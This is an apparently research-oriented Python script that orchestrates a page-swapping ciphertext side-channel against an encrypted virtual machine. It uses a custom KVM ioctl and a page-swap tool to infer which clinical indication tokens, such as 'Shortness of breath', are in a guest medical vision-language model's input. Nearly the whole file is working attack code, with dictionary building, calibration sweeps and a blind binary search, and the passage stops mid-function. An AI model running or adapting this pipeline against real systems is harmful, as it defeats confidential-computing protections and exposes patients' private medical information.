#!/usr/bin/env python3
"""
orchestrate_v2.py — Dictionary-based LLM token side-channel pipeline.

Flow:
  Phase 0 (pre-build, run once):
    For every possible token_offset (0, 8, 16, ..., 4088) and every token 0-3:
      send ICMP with prefix=token_offset → get GPA → dump ciphertext
    Saves dictionary to dict_cache.json + individual *.out files.

  Phase 1 (per inference):
    Run guest → indication_gpa = base_gpa + (HEADER_CONST + N) × 8
    token_offset = indication_gpa & 0xFFF
    Load pre-built dict[token_offset] → for each token_idx:
      page_move(indication_page ↔ dict_gpa, no swap-back, RMP updated)
      read ciphertext at dict_gpa → compare with pre-dump
      MATCH if unchanged (same plaintext at that GPA)

Usage:
    sudo python3 orchestrate_v2.py --build
    sudo python3 orchestrate_v2.py --index <N>
    sudo python3 orchestrate_v2.py --index <N> --header-const 43
"""

import argparse
import csv
import ctypes
import datetime
import fcntl
import json
import os
import re
import struct
import subprocess
import sys
import threading
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# logging
# ---------------------------------------------------------------------------

_log_fh = None   # optional file handle set by --log-file


def log(msg: str = "", file=None) -> None:
    """Print with timestamp to stdout and optionally to log file."""
    ts  = datetime.datetime.now().strftime("%H:%M:%S")
    out = f"[{ts}] {msg}" if msg and not msg.startswith("  ") else msg
    print(out, file=file or sys.stdout)
    if _log_fh and file is None:
        print(out, file=_log_fh)
        _log_fh.flush()


def log_err(msg: str) -> None:
    log(msg, file=sys.stderr)
    if _log_fh:
        print(msg, file=_log_fh)
        _log_fh.flush()

HERE = Path(__file__).parent

GUEST_SSH  = "ubuntu@localhost"
GUEST_PORT = "7777"
_sudo_user = os.environ.get("SUDO_USER")
_ssh_key   = (Path(f"/home/{_sudo_user}/.ssh/id_ed25519")
              if _sudo_user else Path.home() / ".ssh/id_ed25519")
SSH_BASE   = [
    "ssh", "-p", GUEST_PORT,
    "-i", str(_ssh_key),
    "-o", "StrictHostKeyChecking=no",
    "-o", "BatchMode=yes",
    "-o", "ConnectTimeout=30",
    GUEST_SSH,
]

SWAP_TOOL   = HERE / "swap_pages_tool"
READ_GPA    = HERE / "read_gpa.py"
SEND_TOKENS = HERE / "send_tokens.py"
VERIFY      = HERE / "verify.py"
DICT_CACHE  = HERE / "dict_cache.json"
DICT_DIR    = HERE / "dict_pages"
RESULTS_CSV = HERE / "results_v2_const43.csv"

GUEST_SCRIPT_DEFAULT  = "~/medical_ml/med_vlm/scripts/single_inference_indication_gpa.py"
GUEST_CWD_DEFAULT     = "~/medical_ml/med_vlm/scripts"
GUEST_DATASET_DEFAULT = "~/medical_ml/med_vlm/rexgradient/ReXGradient/metadata/rexgradient_test.json"
GUEST_PYTHON_DEFAULT  = "/home/ubuntu/miniconda3/envs/vlm/bin/python3"

IMAGE_PAD_TOKEN_ID = 151655   # Qwen2-VL <|image_pad|>

TOKEN_LABELS = [
    # 3-token labels (24B)
    ("Chest PAIN",          [41771, 393, 6836]),            # 0  3tok
    ("Short of breath",     [10698, 315, 11486]),           # 1  3tok
    ("short of breath",     [2805,  315, 11486]),           # 2  3tok
    ("Productive cough",    [5643,  533, 39600]),           # 3  3tok
    ("Left chest pain",     [13727, 15138, 6646]),          # 4  3tok
    ("Central chest pain",  [10684, 15138, 6646]),          # 5  3tok
    ("Nonproductive cough", [11581, 33270, 39600]),         # 6  3tok
    # 4-token labels (32B)
    ("Shortness of breath", [10698, 2090, 315, 11486]),    # 7  4tok
    ("shortness of breath", [2805,  2090, 315, 11486]),    # 8  4tok
    ("CHEST PAIN",          [49521, 784, 393, 6836]),       # 9  4tok
    ("Shortness of Breath", [10698, 2090, 315, 57192]),    # 10 4tok
    ("shortness of Breath", [2805,  2090, 315, 57192]),    # 11 4tok
    ("Respiratory failure", [76834, 5269, 7901]),           # 12 3tok
    ("Altered mental status",[1674, 33159, 10502, 2639]),  # 13 4tok
    ("altered mental status",[28752, 10502, 2639]),         # 14 3tok
    ("Respiratory distress",[76834, 5269, 34004]),          # 15 3tok
    ("Abdominal pain",      [3680,  5600, 977, 6646]),      # 16 4tok
    ("Left-sided chest pain",[13727, 49758, 15138, 6646]), # 17 4tok
    ("Right-sided chest pain",[10083, 49758, 15138, 6646]),# 18 4tok
    ("Acute respiratory failure",[6381, 1070, 41531, 7901]),# 19 4tok
    # compound forms
    ("Increasing shortness of breath",     [73440, 2805, 2090, 315, 11486]),          # 20 5tok
    ("Severe shortness of breath",         [1345, 19289, 2805, 2090, 315, 11486]),   # 21 6tok
    ("Cough, short of breath",             [356, 1384, 11, 2805, 315, 11486]),        # 22 6tok
    ("Cough, shortness of breath",         [356, 1384, 11, 2805, 2090, 315, 11486]), # 23 7tok
    ("Cough and shortness of breath",      [356, 1384, 323, 2805, 2090, 315, 11486]),# 24 7tok
    ("Worsening shortness of breath",      [467, 1087, 6019, 2805, 2090, 315, 11486]),# 25 7tok
    ("Acute onset of shortness of breath", [6381, 1070, 40980, 315, 2805, 2090, 315, 11486]), # 26 8tok
    # 2-token labels (16B) — only mod16==0 offsets produce clean AES blocks (~50% hit rate)
    ("respiratory failure", [41531, 7901]),                 # 27 2tok
    ("respiratory distress",[41531, 34004]),                # 28 2tok
    ("abdominal pain",      [55956, 6646]),                 # 29 2tok
    # sentinel for blind N-estimation: consecutive image_pad tokens
    ("image_pad×4",         [IMAGE_PAD_TOKEN_ID] * 4),     # 30 4tok
]

# TOKEN_LABELS index of the image_pad sentinel (used by sweep_blind Phase 1)
_IPAD4_IDX = next(i for i, (l, _) in enumerate(TOKEN_LABELS) if l == "image_pad×4")

# Iteration order for compare_with_dict: most-frequent label first → maximises
# early-exit and minimises page swaps.  Computed from valid_indices frequency;
# sentinel (_IPAD4_IDX) excluded.  Regenerate with analyze_indications.py when
# TOKEN_LABELS changes significantly.
_LABEL_ORDER: list[int] = [
    7, 8, 12, 27, 1, 15, 28, 13, 14, 16, 29, 2, 11, 10, 17, 18, 19, 21, 20,
    23, 24, 22, 25, 26, 9, 0, 4, 5, 3, 6,
]

HEADER_CONST: int | None = 43
_GPA_TIMEOUT = 150
DRAIN_EVERY  = 16   # drain guest ICMP RX buffer every N build entries
_GUEST_RECOVERY_TIMEOUT = 300  # seconds to wait for guest VM to recover after crash

CAL_H_MIN = 30   # calibration sweep range for HEADER_CONST
CAL_H_MAX = 60

FIRST_PAD_POS = 15  # position of first <|image_pad|> token in input_ids (constant)
N_SWEEP_MIN   = 30  # minimum N_image_pad across dataset (measured: 36, with margin)
N_SWEEP_MAX   = 1200  # maximum N_image_pad across dataset (measured: 1178)
POST_SCAN_MIN = 20  # min tokens between vision_end and indication (measured: ~28)
POST_SCAN_MAX = 60  # max tokens between vision_end and indication (measured: ~46)


# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------

def ssh(cmd: str, timeout: int = 15) -> str:
    try:
        r = subprocess.run(SSH_BASE + [cmd], capture_output=True, text=True, timeout=timeout)
        return r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        return ""


def _guest_alive(timeout: int = 5) -> bool:
    """Return True if the guest VM answers SSH within timeout seconds."""
    try:
        r = subprocess.run(SSH_BASE + ["echo ok"],
                           capture_output=True, text=True, timeout=timeout)
        return r.returncode == 0
    except Exception:
        return False


def _wait_guest_alive(max_wait: int = _GUEST_RECOVERY_TIMEOUT) -> bool:
    """Poll SSH every 15 s until the guest responds or max_wait seconds elapse.

    Returns True if the guest came back; False on timeout.
    Does NOT drain the ICMP buffer — the guest has rebooted so the buffer is empty.
    """
    log(f"[guest] Waiting for guest to recover (up to {max_wait}s) ...")
    deadline = time.time() + max_wait
    while time.time() < deadline:
        if _guest_alive():
            log("[guest] Guest reachable — sleeping 10 s for full boot")
            time.sleep(10)
            return True
        time.sleep(15)
    log_err(f"[guest] Guest did not recover within {max_wait}s")
    return False


def run(label: str, cmd: list) -> None:
    log(f"  $ {' '.join(str(c) for c in cmd)}")
    rc = subprocess.run(cmd).returncode
    if rc != 0:
        log_err(f"[!] {label} failed (exit {rc})")
        sys.exit(1)



# ---------------------------------------------------------------------------
# Swap-back + kernel page dump  (avoids two separate one-way moves)
# ---------------------------------------------------------------------------

# KVM_READ_PAGE_DUMP = _IOR(0xAE, 0x2b, 4096)
_KVMIO            = 0xAE
_PAGE_SIZE        = 4096
KVM_READ_PAGE_DUMP = (0x80000000
                      | ((_PAGE_SIZE & 0x3FFF) << 16)
                      | (_KVMIO << 8)
                      | 0x2b)


def _bytes_to_xp_dump(gpa: int, raw: bytes) -> str:
    """Format PAGE_SIZE raw bytes as QEMU xp /512gx output (little-endian qwords)."""
    lines = [f"(qemu) xp /512gx 0x{gpa:x}"]
    for i in range(0, _PAGE_SIZE, 16):
        addr = gpa + i
        lo = int.from_bytes(raw[i:i+8],    "little")
        hi = int.from_bytes(raw[i+8:i+16], "little")
        lines.append(f"{addr:016x}: 0x{lo:016x} 0x{hi:016x}")
    return "\n".join(lines)


def do_swap_read(swap_tool: str, dict_gpa: int, src_gpa: int,
                 out_path: Path, kvm_dev: str = "/dev/kvm") -> None:
    """
    Round-trip swap + read via kernel buffer.

    Calls swap_pages_tool with --swap-back so the kernel executes:
      forward swap(gfn1=dict_gpa, gfn2=src_gpa)
      → copy gfn1 ciphertext (src data at dict_gpa physical tweak) to buffer
      → backward swap (restore)
    all in one svm_vcpu_run() call before VMRUN.  The guest never sees the
    swapped RMP state, eliminating KVM_SYSTEM_EVENT_SEV_TERM crashes.

    Then reads KVM_READ_PAGE_DUMP and saves xp-format output to out_path.
    """
    run("swap_pages_tool (swap-back)",
        [swap_tool, f"0x{dict_gpa:x}", f"0x{src_gpa:x}", "--swap-back"])

    kvm_fd = os.open(kvm_dev, os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(_PAGE_SIZE)
        fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
        raw = bytes(buf)
    finally:
        os.close(kvm_fd)

    dump = _bytes_to_xp_dump(dict_gpa, raw)
    out_path.write_text(dump + "\n")
    log(f"  saved → {out_path.name}")



def acquire_token_gpa(token_idx: int, prefix: int = 0) -> tuple[int, int]:
    """Send one ICMP packet and parse GPA + frag_p1 from guest dmesg."""
    ssh("sudo dmesg -C")
    cmd = [sys.executable, str(SEND_TOKENS), str(token_idx), "1"]
    if prefix:
        cmd += ["--prefix", str(prefix)]
    subprocess.run(cmd, check=True, capture_output=True)
    time.sleep(1)

    out = ""
    gpas = []
    for attempt in range(3):
        out = ssh("sudo dmesg", timeout=40)
        gpas = re.findall(r"sub-page\[\d+\]\s+GPA=0x([0-9a-f]+)", out, re.IGNORECASE)
        if gpas:
            break
        if attempt < 2:
            time.sleep(3)

    if not gpas:
        raise RuntimeError("[!] No GPA in guest dmesg")

    gpa = int(gpas[-1], 16)
    frag_p1 = 970  # fallback
    m = re.search(r"frag\[0\].*?\boff=(\d+)", out)
    if m:
        frag_off = int(m.group(1))
        frag_p1 = 4096 - (frag_off % 4096) - 8
    return gpa, frag_p1


def _acquire_gpa_raw(index: int,
                     script: str = GUEST_SCRIPT_DEFAULT,
                     cwd: str = GUEST_CWD_DEFAULT,
                     python: str = GUEST_PYTHON_DEFAULT,
                     base_only: bool = False) -> tuple:
    """Run guest --gpa-only; return (base_gpa, N, proc) or (None, None, None).
    If base_only=True, returns as soon as base_gpa is found (N not waited for).
    """
    nvidia_lib = (
        "$(ls -d /usr/local/lib/python3.10/dist-packages/nvidia/*/lib 2>/dev/null"
        " | tr '\\n' ':')"
    )
    cmd = (f"source ~/miniconda3/etc/profile.d/conda.sh && conda activate vlm && "
           f"export LD_LIBRARY_PATH={nvidia_lib}$LD_LIBRARY_PATH && "
           f"cd {cwd} && sudo -E env LD_LIBRARY_PATH=\"$LD_LIBRARY_PATH\" "
           f"{python} -u {script} --index {index} --gpa-only")
    print(f"  [guest] {cmd}")

    for attempt in range(3):
        proc = subprocess.Popen(SSH_BASE + [cmd],
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                                stderr=subprocess.PIPE, text=True)
        result: dict = {}

        def _reader(stdout, out):
            for line in stdout:
                print(f"  [guest] {line}", end="", flush=True)
                m = re.search(r"input_ids base GPA:\s+0x([0-9a-f]+)", line, re.IGNORECASE)
                if m:
                    out["base_gpa"] = int(m.group(1), 16)
                m = re.search(r"N_image_pad:\s+(\d+)", line)
                if m:
                    out["N"] = int(m.group(1))
                if base_only and "base_gpa" in out:
                    break
                if not base_only and "base_gpa" in out and "N" in out:
                    break

        t = threading.Thread(target=_reader, args=(proc.stdout, result), daemon=True)
        t.start()
        t.join(timeout=_GPA_TIMEOUT)

        if base_only and "base_gpa" in result:
            log(f"  [host] base_gpa=0x{result['base_gpa']:x}  (blind mode — N not used)")
            return result["base_gpa"], None, proc
        if not base_only and "base_gpa" in result and "N" in result:
            log(f"  [host] base_gpa=0x{result['base_gpa']:x}  N={result['N']}")
            return result["base_gpa"], result["N"], proc

        try:
            proc.kill()
        except Exception:
            pass
        try:
            stderr_out = proc.stderr.read()
        except Exception:
            stderr_out = ""
        proc.wait()
        log_err(f"[!] GPA timeout/failed index={index} ({attempt+1}/3)")
        if stderr_out.strip():
            log_err(f"  [guest stderr] {stderr_out.strip()}")
        if attempt < 2:
            time.sleep(15)

    return None, None, None


def acquire_indication_gpa(index: int,
                            script: str = GUEST_SCRIPT_DEFAULT,
                            cwd: str = GUEST_CWD_DEFAULT,
                            python: str = GUEST_PYTHON_DEFAULT,
                            header_const: int | None = None) -> tuple:
    """Run guest --gpa-only, return (indication_gpa, proc).

    header_const overrides the global HEADER_CONST for this call (per-index
    lookup from _index_const; falls back to global when None).
    """
    base_gpa, N, proc = _acquire_gpa_raw(index, script, cwd, python)
    if base_gpa is None:
        return None, None
    hc             = header_const if header_const is not None else HEADER_CONST
    tok_start      = hc + N
    indication_gpa = base_gpa + tok_start * 8
    log(f"  [host] header_const={hc}  tok_start={tok_start}")
    log(f"  [host] indication_gpa=0x{indication_gpa:x}")
    return indication_gpa, proc


CAL_MAX_RETRIES = 3   # fresh base_gpa attempts before giving up


def calibrate_header_const(index: int, swap_tool: str, cache: dict,
                            script: str = GUEST_SCRIPT_DEFAULT,
                            cwd: str = GUEST_CWD_DEFAULT,
                            python: str = GUEST_PYTHON_DEFAULT) -> int | None:
    """
    Sweep HEADER_CONST candidates [CAL_H_MIN, CAL_H_MAX] to find the correct value.

    For each candidate h the indication page is moved to the matching dict GPA and
    its ciphertext is compared against the pre-captured token page.  Stops at the
    first MATCH and returns that h.  Returns None if no match is found.

    Retries up to CAL_MAX_RETRIES times with a fresh base_gpa from the guest if no
    match is found.  This handles the AES alignment issue: 2-token labels (16 B)
    have no clean AES blocks when token_offset % 16 == 8.  A fresh guest run gives
    a new base_gpa with ~50% probability of better alignment.
    """
    for cal_attempt in range(CAL_MAX_RETRIES):
        if cal_attempt == 0:
            log(f"[calibrate] Acquiring base_gpa and N (index={index})...")
        else:
            log(f"[calibrate] Retry {cal_attempt}/{CAL_MAX_RETRIES - 1} — "
                f"acquiring fresh base_gpa (index={index})...")

        base_gpa, N, proc = _acquire_gpa_raw(index, script, cwd, python)
        if base_gpa is None:
            log_err("[calibrate] Failed to acquire GPA from guest")
            return None

        log(f"[calibrate] Sweeping HEADER_CONST in [{CAL_H_MIN}, {CAL_H_MAX}] "
            f"(attempt {cal_attempt + 1}/{CAL_MAX_RETRIES})...")

        matched_h = None
        try:
            for h in range(CAL_H_MIN, CAL_H_MAX + 1):
                tok_start    = h + N
                token_offset = (base_gpa + tok_start * 8) & 0xFFF
                src_gpa      = (base_gpa + tok_start * 8) & ~0xFFF
                off_key      = hex(token_offset)

                if off_key not in cache:
                    log(f"  [h={h:2d}] token_offset=0x{token_offset:03x} — not in dict, skip")
                    continue

                log(f"  [h={h:2d}] tok_start={tok_start}  token_offset=0x{token_offset:03x}")

                for token_idx in range(len(TOKEN_LABELS)):
                    if token_idx == _IPAD4_IDX:
                        continue   # sentinel only; not an indication token
                    entry = cache[off_key].get(str(token_idx))
                    if entry is None:
                        continue

                    label, token_ids = TOKEN_LABELS[token_idx]
                    dict_gpa         = int(entry["gpa"], 16)
                    token_ids_str    = ",".join(str(i) for i in token_ids)

                    log(f"    [token_idx={token_idx}] '{label}'  "
                        f"swap-back read: dict_gpa=0x{dict_gpa:x}  src=0x{src_gpa:x}")

                    post_name = f"cal_h{h}_t{token_idx}"
                    post_path = HERE / f"{post_name}.out"
                    do_swap_read(swap_tool, dict_gpa, src_gpa, post_path)

                    r = subprocess.run([
                        sys.executable, str(VERIFY), "verify",
                        "--cp",           entry["cp_file"],
                        "--post",         str(post_path),
                        "--token-offset", hex(token_offset),
                        "--token-ids",    token_ids_str,
                    ], capture_output=True, text=True)

                    for line in r.stdout.splitlines():
                        log(f"      {line}")
                    if r.stderr:
                        for line in r.stderr.splitlines():
                            log_err(f"      {line}")

                    if "Result: MATCH ✓" in r.stdout:
                        log(f"\n[calibrate] MATCH: h={h}  token='{label}'")
                        log(f"[calibrate] HEADER_CONST = {h}")
                        log(f"[calibrate] Re-run with: --header-const {h}")
                        matched_h = h
                        break

                if matched_h is not None:
                    break

        finally:
            if proc is not None:
                try:
                    proc.stdin.close()
                    proc.wait(timeout=10)
                except Exception:
                    proc.kill()

        if matched_h is not None:
            return matched_h

        log(f"[calibrate] No match in attempt {cal_attempt + 1}/{CAL_MAX_RETRIES}.")
        if cal_attempt < CAL_MAX_RETRIES - 1:
            log("[calibrate] AES alignment may be unfavourable — retrying with fresh base_gpa.")

    log_err(f"[calibrate] No match found in [{CAL_H_MIN}, {CAL_H_MAX}] "
            f"after {CAL_MAX_RETRIES} attempts.")
    log_err(f"[calibrate] Check: TOKEN_LABELS match sample's indication, "
            f"dict_cache is current, CAL_H_MIN/MAX covers true HEADER_CONST.")
    return None


def calibrate_all_combos(swap_tool: str, cache: dict,
                          script: str = GUEST_SCRIPT_DEFAULT,
                          cwd: str = GUEST_CWD_DEFAULT,
                          python: str = GUEST_PYTHON_DEFAULT) -> dict:
    """
    Calibrate HEADER_CONST for every metadata combination in the dataset.

    Queries the guest for one representative sample per combo that has a
    matching TOKEN_LABEL, runs calibrate_header_const on it, and saves
    the results to combo_const.json.

    The standard combo (age=1 sex=1 eth=0) is seeded with the known value
    HEADER_CONST=43 and skipped if that is already set.

    Returns {combo_key: header_const}.
    """
    # Load existing results so we can resume
    combo_const: dict[str, int] = {}
    if COMBO_CONST_CACHE.exists():
        with open(COMBO_CONST_CACHE) as f:
            combo_const = json.load(f)
        log(f"[combo-cal] Loaded {len(combo_const)} existing combo entries")

    labels = [label for label, _ in TOKEN_LABELS if label != "image_pad×4"]

    # Ask guest for one representative index per combo that has a matching label
    script_py = f"""
import json
data = json.load(open('/home/ubuntu/medical_ml/med_vlm/rexgradient/ReXGradient/metadata/rexgradient_test.json'))
labels = {labels!r}
seen = {{}}
for i, s in enumerate(data):
    ind = s.get('indication') or ''
    if not any(lb in ind for lb in labels):
        continue
    key = 'age=%d sex=%d eth=%d' % (bool(s.get('age')), bool(s.get('sex')), bool(s.get('ethnicGroup')))
    if key not in seen:
        seen[key] = i
for k, v in sorted(seen.items()):
    print(k, v)
"""
    proc = subprocess.Popen(SSH_BASE + ["python3 -"],
                            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, text=True)
    stdout, _ = proc.communicate(input=script_py)
    combos: dict[str, int] = {}   # combo_key → representative index
    for line in stdout.splitlines():
        parts = line.strip().split()
        if len(parts) == 4:
            key = " ".join(parts[:3])
            combos[key] = int(parts[3])

    log(f"[combo-cal] {len(combos)} combos found: {list(combos.keys())}")

    # Seed known value
    std_key = "age=1 sex=1 eth=0"
    if std_key not in combo_const and HEADER_CONST is not None:
        combo_const[std_key] = HEADER_CONST
        log(f"[combo-cal] Seeded {std_key} = {HEADER_CONST}")

    for key, rep_idx in combos.items():
        if key in combo_const:
            log(f"[combo-cal] {key} already calibrated → {combo_const[key]}  (skip)")
            continue
        log(f"\n[combo-cal] Calibrating {key}  (representative index={rep_idx})")
        h = calibrate_header_const(rep_idx, swap_tool, cache, script, cwd, python)
        if h is not None:
            combo_const[key] = h
            log(f"[combo-cal] {key} → HEADER_CONST={h}")
        else:
            log_err(f"[combo-cal] Failed to calibrate {key} — skipping")

        with open(COMBO_CONST_CACHE, "w") as f:
            json.dump(combo_const, f, indent=2)

    log(f"[combo-cal] Done. Saved to {COMBO_CONST_CACHE}")
    return combo_const


def build_index_const(combo_const: dict) -> dict[str, int]:
    """
    Generate index_const.json mapping every matching sample index to its
    HEADER_CONST based on the sample's metadata combination.

    Queries the guest dataset, expands valid_indices to all matching samples
    (not just prefix_tokens==28), and writes index_const.json.

    Returns {str(index): header_const}.
    """
    labels = [label for label, _ in TOKEN_LABELS if label != "image_pad×4"]
    script_py = f"""
import json
data = json.load(open('/home/ubuntu/medical_ml/med_vlm/rexgradient/ReXGradient/metadata/rexgradient_test.json'))
labels = {labels!r}
for i, s in enumerate(data):
    ind = s.get('indication') or ''
    if not any(lb in ind for lb in labels):
        continue
    key = 'age=%d sex=%d eth=%d' % (bool(s.get('age')), bool(s.get('sex')), bool(s.get('ethnicGroup')))
    print(i, key)
"""
    proc = subprocess.Popen(SSH_BASE + ["python3 -"],
                            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, text=True)
    stdout, stderr = proc.communicate(input=script_py)
    if not stdout.strip():
        log_err(f"[build-index-const] Guest query failed: {stderr.strip()}")
        return {}

    index_const: dict[str, int] = {}
    skipped = []
    for line in stdout.splitlines():
        parts = line.strip().split()
        if len(parts) != 4:
            continue
        idx = parts[0]
        key = " ".join(parts[1:])
        if key in combo_const:
            index_const[idx] = combo_const[key]
        else:
            skipped.append((idx, key))

    if skipped:
        log_err(f"[build-index-const] {len(skipped)} indices skipped (no combo_const entry):")
        for idx, key in skipped[:5]:
            log_err(f"  index={idx}  combo={key}")

    with open(INDEX_CONST_CACHE, "w") as f:
        json.dump(index_const, f, indent=2)

    # Also update valid_indices.json to the full 1077
    valid = sorted(int(k) for k in index_const)
    with open(VALID_INDICES_CACHE, "w") as f:
        json.dump(valid, f)

    log(f"[build-index-const] {len(index_const)} indices → {INDEX_CONST_CACHE.name}")
    log(f"[build-index-const] valid_indices updated: {len(valid)} samples")
    return index_const


def _swap_read_raw(swap_tool: str, dict_gpa: int, ind_page_gpa: int) -> bytes | None:
    """swap-back + KVM_READ_PAGE_DUMP → raw 4 KB bytes.  Returns None on swap failure."""
    r = subprocess.run(
        [swap_tool, f"0x{dict_gpa:x}", f"0x{ind_page_gpa:x}", "--swap-back"],
        capture_output=True)
    if r.returncode != 0:
        log_err(f"  [blind] swap failed dict_gpa=0x{dict_gpa:x} "
                f"ind_page=0x{ind_page_gpa:x} (rc={r.returncode})")
        return None
    kvm_fd = os.open("/dev/kvm", os.O_RDWR | os.O_CLOEXEC)
    try:
        buf = ctypes.create_string_buffer(_PAGE_SIZE)
        fcntl.ioctl(kvm_fd, KVM_READ_PAGE_DUMP, buf)
        return bytes(buf)
    finally:
        os.close(kvm_fd)


_HEX_LINE_CP = re.compile(r'[0-9a-f]{12,16}:\s+(0x[0-9a-f]+)\s+(0x[0-9a-f]+)')


def _parse_cp_file(path: Path) -> bytes | None:
    """Parse xp-format dump file → raw 4096 bytes (same as verify.parse_dump)."""
    try:
        chunks = []
        with open(path, 'r', errors='replace') as f:
            for line in f:
                m = _HEX_LINE_CP.search(line)
                if m:
                    chunks.append(struct.pack('<QQ', int(m.group(1), 16),
                                                    int(m.group(2), 16)))
        return b''.join(chunks) if chunks else None
    except Exception:
        return None


def _clean_aes_blocks_inline(token_offset: int, token_len: int) -> list[int]:
    end        = token_offset + token_len
    first_full = (token_offset + 15) & ~15
    return [b for b in range(first_full, end - 15, 16) if b + 16 <= 4096]


def _verify_raw_inline(raw: bytes, cp_data: bytes,
                       token_offset: int, token_len: int) -> bool:
    """In-process AES-block comparison; equivalent to verify.py cmd_verify."""
    blocks = _clean_aes_blocks_inline(token_offset, token_len)
    if not blocks:
        return False
    return all(raw[blk:blk + 16] == cp_data[blk:blk + 16] for blk in blocks)



def _check_tok_is_image_pad(base_gpa: int, tok_start: int,
                              cache: dict, swap_tool: str) -> bool | None:
    """
    Single swap-back read at tok_start; compare against image_pad×4 dict entry.
    Returns True (MATCH), False (MISMATCH), None (no dict entry or swap failed).
    """
    ind_gpa      = base_gpa + tok_start * 8
    token_offset = ind_gpa & 0xFFF
    ind_page_gpa = ind_gpa & ~0xFFF
    off_key      = hex(token_offset)
    entry        = cache.get(off_key, {}).get(str(_IPAD4_IDX))
    if entry is None:
        return None
    dict_gpa = int(entry["gpa"], 16)
    cp_path  = Path(entry["cp_file"])
    raw = _swap_read_raw(swap_tool, dict_gpa, ind_page_gpa)
    if raw is None:
        return None
    cp_data = _parse_cp_file(cp_path)
    if cp_data is None:
        return None
    if raw == cp_data:   # broken swap range — indeterminate
        return None
    return _verify_raw_inline(raw, cp_data, token_offset, len(TOKEN_LABELS[_IPAD4_IDX][1]) * 8)


def _binary_search_ipad_end(base_gpa: int, cache: dict, swap_tool: str) -> int | None:
    """
    Find the last tok_start where image_pad×4 ciphertext matches.

    image_pad occupies [FIRST_PAD_POS, FIRST_PAD_POS+N-1].
    _check_tok_is_image_pad(p) is True iff all covered AES blocks within
    [p, p+3] are image_pad:
      mod16==0 alignment: checks tokens [p,p+3] → True iff p <= FIRST_PAD_POS+N-4
      mod16==8 alignment: checks tokens [p+1,p+2] → True iff p <= FIRST_PAD_POS+N-3

    Search range covers both cases:
      lo = FIRST_PAD_POS + N_SWEEP_MIN - 4 = 41
      hi = FIRST_PAD_POS + N_SWEEP_MAX - 3 = 1212
    ~ceil(log2(1172)) = 11 swap operations.

    Returns last_true position, or None if no clear boundary found.
    """
    lo        = FIRST_PAD_POS + N_SWEEP_MIN - 4   # 41
    hi        = FIRST_PAD_POS + N_SWEEP_MAX - 3   # 1212
    last_true = None
    n_checks  = 0

    while lo <= hi:
        mid    = (lo + hi) // 2
        result = _check_tok_is_image_pad(base_gpa, mid, cache, swap_tool)
        n_checks += 1
        log(f"  [ipad-bsearch #{n_checks}] tok={mid}  result={result}")
        if result is True:
            last_true = mid
            lo = mid + 1
        else:   # False or None (broken range / missing entry) → treat as past boundary
            hi = mid - 1

    log(f"  [ipad-bsearch] done ({n_checks} checks)  last_true={last_true}")
    return last_true


def sweep_blind(base_gpa: int, cache: dict, swap_tool: str) -> tuple:
    """
    Find indication tok_start and token_idx without knowing N.

    Phase 1: binary search on image_pad region (~11 swaps) to locate N.
    Phase 2: scan indication in
      [FIRST_PAD_POS + N + POST_SCAN_MIN - 1, FIRST_PAD_POS + N + POST_SCAN_MAX + 1]
    (~42 steps × 34 labels vs. previous 1241 × 34, ~30x speedup).
    Falls back to full linear scan if binary search is inconclusive.

    Returns (tok_start, indication_gpa, token_idx_found) or (None, None, None).
    """
    _BSEARCH_MARGIN = 1   # ±1 to cover mod16==0 vs mod16==8 N uncertainty

    log("[blind] Phase 1: binary search for N via image_pad×4 ciphertext...")
    last_true = _binary_search_ipad_end(base_gpa, cache, swap_tool)

    if last_true is not None:
        N_est      = last_true - FIRST_PAD_POS + 4
        tok_p2_min = FIRST_PAD_POS + N_est + POST_SCAN_MIN - _BSEARCH_MARGIN
        tok_p2_max = FIRST_PAD_POS + N_est + POST_SCAN_MAX + _BSEARCH_MARGIN
        log(f"[blind] N≈{N_est}  Phase 2: scanning indication "
            f"[{tok_p2_min}, {tok_p2_max}]  ({tok_p2_max - tok_p2_min + 1} steps)")
    else:
        log_err("[blind] image_pad binary search inconclusive — falling back to linear scan")
        tok_p2_min = FIRST_PAD_POS + POST_SCAN_MIN
        tok_p2_max = FIRST_PAD_POS + N_SWEEP_MAX + POST_SCAN_MAX
        log(f"[blind] linear fallback: [{tok_p2_min}, {tok_p2_max}]"
            f"  ({tok_p2_max - tok_p2_min + 1} steps)")

    _swap_cache: dict[tuple[int, int], bytes | None] = {}
    _cp_cache:   dict[str, bytes | None]             = {}

    _n_swap_ok   = 0
    _n_swap_fail = 0
    _n_swap_self = 0   # swap returned dict's own ciphertext (broken swap range)
    _n_cp_fail   = 0
    _n_no_blocks = 0
    _n_mismatch  = 0

    for tok_start in range(tok_p2_min, tok_p2_max + 1):
        ind_gpa      = base_gpa + tok_start * 8
        token_offset = ind_gpa & 0xFFF
        ind_page_gpa = ind_gpa & ~0xFFF
        off_key      = hex(token_offset)
        if off_key not in cache:
            continue
        entries = cache[off_key]
        for token_idx in _LABEL_ORDER:
            entry = entries.get(str(token_idx))
            if entry is None:
                continue
            label, token_ids = TOKEN_LABELS[token_idx]
            dict_gpa = int(entry["gpa"], 16)
            cp_path  = Path(entry["cp_file"])

            swap_key = (dict_gpa, ind_page_gpa)
            if swap_key not in _swap_cache:
                _swap_cache[swap_key] = _swap_read_raw(swap_tool, dict_gpa, ind_page_gpa)
            raw = _swap_cache[swap_key]
            if raw is None:
                _n_swap_fail += 1
                continue
            _n_swap_ok += 1

            cp_key = str(cp_path)
            if cp_key not in _cp_cache:
                _cp_cache[cp_key] = _parse_cp_file(cp_path)
            cp_data = _cp_cache[cp_key]
            if cp_data is None:
                _n_cp_fail += 1
                continue

            # Broken-swap guard: if the swap tool is in an incompatible memory range it
            # returns the dict page's own ciphertext instead of the ind_page content.
            # raw == cp_data (full 4 KB) means no real swap happened → false positive risk.
            # Invalidate this swap_key so all later token_idx iterations also skip it.
            if raw == cp_data:
                _n_swap_self += 1
                _swap_cache[swap_key] = None
                continue

            blocks = _clean_aes_blocks_inline(token_offset, len(token_ids) * 8)
            if not blocks:
                _n_no_blocks += 1
                continue

            ok = _verify_raw_inline(raw, cp_data, token_offset, len(token_ids) * 8)
            if ok:
